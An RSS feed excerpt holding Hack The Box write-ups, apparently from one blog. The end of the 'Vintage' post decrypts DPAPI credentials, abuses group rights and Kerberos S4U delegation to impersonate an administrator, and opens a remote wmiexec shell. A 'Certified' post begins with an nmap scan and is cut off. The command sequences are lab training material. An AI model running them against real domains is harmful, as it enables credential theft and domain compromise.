&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Flags : &lt;span class="m">0&lt;/span> &lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Policy : &lt;span class="m">0&lt;/span> &lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">MasterKeyLen: &lt;span class="m">00000088&lt;/span> &lt;span class="o">(&lt;/span>136&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">BackupKeyLen: &lt;span class="m">00000068&lt;/span> &lt;span class="o">(&lt;/span>104&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CredHistLen : &lt;span class="m">00000000&lt;/span> &lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DomainKeyLen: &lt;span class="m">00000174&lt;/span> &lt;span class="o">(&lt;/span>372&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Decrypted key with User Key &lt;span class="o">(&lt;/span>MD4 protected&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Once the Master Key is decrypted, it can be used to decrypt stored credentials. This command decrypts the credential file using the extracted Master Key.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>CREDENTIAL&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">LastWritten : 2024-06-07 15:08:23
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Flags : 0x00000030 &lt;span class="o">(&lt;/span>CRED_FLAGS_REQUIRE_CONFIRMATION&lt;span class="p">|&lt;/span>CRED_FLAGS_WILDCARD_MATCH&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Persist : 0x00000003 &lt;span class="o">(&lt;/span>CRED_PERSIST_ENTERPRISE&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Type : 0x00000001 &lt;span class="o">(&lt;/span>CRED_TYPE_GENERIC&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Target : LegacyGeneric:target&lt;span class="o">=&lt;/span>admin_acc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Description :
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Unknown :
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Username : vintage&lt;span class="se">\c&lt;/span>.neri_adm
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Unknown : Uncr4ck4bl3P4ssW0rd0312
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>Bloodhound&lt;/code> reveals that we can add ourselves to the &lt;code>DELEGATEDAMINS&lt;/code> which from its name seems to be a good target.&lt;/p>
&lt;p>&lt;img src="https://r4z1o.github.io/p/vintage-htb-writeup/Bloodhound7.png"
width="658"
height="256"
srcset="https://r4z1o.github.io/p/vintage-htb-writeup/Bloodhound7_hu_5eed3e6499c2663d.png 480w, https://r4z1o.github.io/p/vintage-htb-writeup/Bloodhound7_hu_64f93e8276e7e542.png 1024w"
loading="lazy"
alt="Bloodhound"
class="gallery-image"
data-flex-grow="257"
data-flex-basis="616px"
>&lt;/p>
&lt;p>Now we will add &lt;code>SVC_SQL&lt;/code>to this group using &lt;code>bloodyAD&lt;/code>, as we have &lt;code>GenericWrite&lt;/code> on it.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d &lt;span class="s2">&amp;#34;VINTAGE.HTB&amp;#34;&lt;/span> -u c.neri_adm -p &lt;span class="s1">&amp;#39;Uncr4ck4bl3P4ssW0rd0312&amp;#39;&lt;/span> -k add groupMember &lt;span class="s2">&amp;#34;DELEGATEDADMINS&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;SVC_SQL&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> SVC_SQL added to DELEGATEDADMINS
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ bloodyAD --host dc01.vintage.htb -d &lt;span class="s2">&amp;#34;VINTAGE.HTB&amp;#34;&lt;/span> --dc-ip 10.10.11.45 -k &lt;span class="nb">set&lt;/span> object &lt;span class="s2">&amp;#34;SVC_SQL&amp;#34;&lt;/span> servicePrincipalName -v &lt;span class="s2">&amp;#34;HTTP/skibbidy&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> SVC_SQL&lt;span class="err">&amp;#39;&lt;/span>s servicePrincipalName has been updated
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ getTGT.py -dc-ip 10.10.11.45 vintage/svc_sql:Zer0the0ne
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Saving ticket in svc_sql.ccache
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ &lt;span class="nb">export&lt;/span> &lt;span class="nv">KRB5CCNAME&lt;/span>&lt;span class="o">=&lt;/span>svc_sql.ccache
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ getST.py -spn &lt;span class="s1">&amp;#39;HTTP/dc01.vintage.htb&amp;#39;&lt;/span> -impersonate L.BIANCHI_ADM -dc-ip 10.10.11.45 -k &lt;span class="s1">&amp;#39;vintage.htb/svc_sql:Zer0the0ne&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Getting TGT &lt;span class="k">for&lt;/span> user
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Impersonating L.BIANCHI_ADM
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/home/ayoub/.local/bin/getST.py:321: DeprecationWarning: datetime.datetime.utcnow&lt;span class="o">()&lt;/span> is deprecated and scheduled &lt;span class="k">for&lt;/span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now&lt;span class="o">(&lt;/span>datetime.UTC&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">now&lt;/span> &lt;span class="o">=&lt;/span> datetime.datetime.utcnow&lt;span class="o">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/home/ayoub/.local/bin/getST.py:408: DeprecationWarning: datetime.datetime.utcnow&lt;span class="o">()&lt;/span> is deprecated and scheduled &lt;span class="k">for&lt;/span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now&lt;span class="o">(&lt;/span>datetime.UTC&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">now&lt;/span> &lt;span class="o">=&lt;/span> datetime.datetime.utcnow&lt;span class="o">()&lt;/span> + datetime.timedelta&lt;span class="o">(&lt;/span>&lt;span class="nv">days&lt;/span>&lt;span class="o">=&lt;/span>1&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Requesting S4U2self
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/home/ayoub/.local/bin/getST.py:532: DeprecationWarning: datetime.datetime.utcnow&lt;span class="o">()&lt;/span> is deprecated and scheduled &lt;span class="k">for&lt;/span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now&lt;span class="o">(&lt;/span>datetime.UTC&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">now&lt;/span> &lt;span class="o">=&lt;/span> datetime.datetime.utcnow&lt;span class="o">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/home/ayoub/.local/bin/getST.py:584: DeprecationWarning: datetime.datetime.utcnow&lt;span class="o">()&lt;/span> is deprecated and scheduled &lt;span class="k">for&lt;/span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now&lt;span class="o">(&lt;/span>datetime.UTC&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">now&lt;/span> &lt;span class="o">=&lt;/span> datetime.datetime.utcnow&lt;span class="o">()&lt;/span> + datetime.timedelta&lt;span class="o">(&lt;/span>&lt;span class="nv">days&lt;/span>&lt;span class="o">=&lt;/span>1&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Requesting S4U2Proxy
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Saving ticket in L.BIANCHI_ADM.ccache
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ &lt;span class="nb">export&lt;/span> &lt;span class="nv">KRB5CCNAME&lt;/span>&lt;span class="o">=&lt;/span>L.BIANCHI_ADM.ccache
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ wmiexec.py -k -no-pass VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> SMBv3.0 dialect used
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>!&lt;span class="o">]&lt;/span> Launching semi-interactive shell - Careful what you execute
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>!&lt;span class="o">]&lt;/span> Press &lt;span class="nb">help&lt;/span> &lt;span class="k">for&lt;/span> extra shell commands
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\&amp;gt;&lt;/span>whomai
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;whomai&amp;#39;&lt;/span> is not recognized as an internal or external command,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">operable program or batch file.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\&amp;gt;&lt;/span>whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vintage&lt;span class="se">\l&lt;/span>.bianchi_adm
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\&amp;gt;&lt;/span>&lt;span class="nb">cd&lt;/span> C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\D&lt;/span>esktop
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\D&lt;/span>esktop&amp;gt;dir
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Volume in drive C has no label.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Volume Serial Number is B8C0-0CD3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Directory of C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\D&lt;/span>esktop
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">11/14/2024 07:48 PM &amp;lt;DIR&amp;gt; .
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">06/08/2024 03:36 PM &amp;lt;DIR&amp;gt; ..
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">03/17/2025 12:02 PM &lt;span class="m">34&lt;/span> root.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1&lt;/span> File&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span> &lt;span class="m">34&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2&lt;/span> Dir&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span> 5,729,939,456 bytes free
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\D&lt;/span>esktop&amp;gt;type root.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">43fc4b204b904ddc0176ab7493ff5a21
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>Certified HTB Writeup</title><link>https://r4z1o.github.io/p/certified-htb-writeup/</link><pubDate>Tue, 25 Feb 2025 00:00:00 +0000</pubDate><guid>https://r4z1o.github.io/p/certified-htb-writeup/</guid><description>&lt;img src="https://r4z1o.github.io/p/certified-htb-writeup/Certified.png" alt="Featured image of post Certified HTB Writeup" />&lt;p>First, we start with a broad nmap scan, that reveals the following results :&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;span class="lnt">64
&lt;/span>&lt;span class="lnt">65
&lt;/span>&lt;span class="lnt">66
&lt;/span>&lt;span class="lnt">67
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Certified&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo nmap -sV -sC -O -Pn --disable-arp-ping -p- -o Broad-scan-nmap 10.10.11.41
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.11.41
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.14s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">65515&lt;/span> filtered tcp ports &lt;span class="o">(&lt;/span>no-response&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">53/tcp open domain Simple DNS Plus
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">88/tcp open kerberos-sec Microsoft Windows Kerberos &lt;span class="o">(&lt;/span>server time: 2025-02-23 08:21:35Z&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">135/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn Microsoft Windows netbios-ssn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">389/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span class="o">(&lt;/span>Domain: certified.htb0., Site: Default-First-Site-Name&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssl-cert: Subject: &lt;span class="nv">commonName&lt;/span>&lt;span class="o">=&lt;/span>DC01.certified.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&amp;lt;unsupported&amp;gt;, DNS:DC01.certified.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Not valid before: 2024-05-13T15:49:36
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_Not valid after: 2025-05-13T15:49:36
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ssl-date: 2025-02-23T08:23:13+00:00&lt;span class="p">;&lt;/span> +2h49m55s from scanner time.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open microsoft-ds?
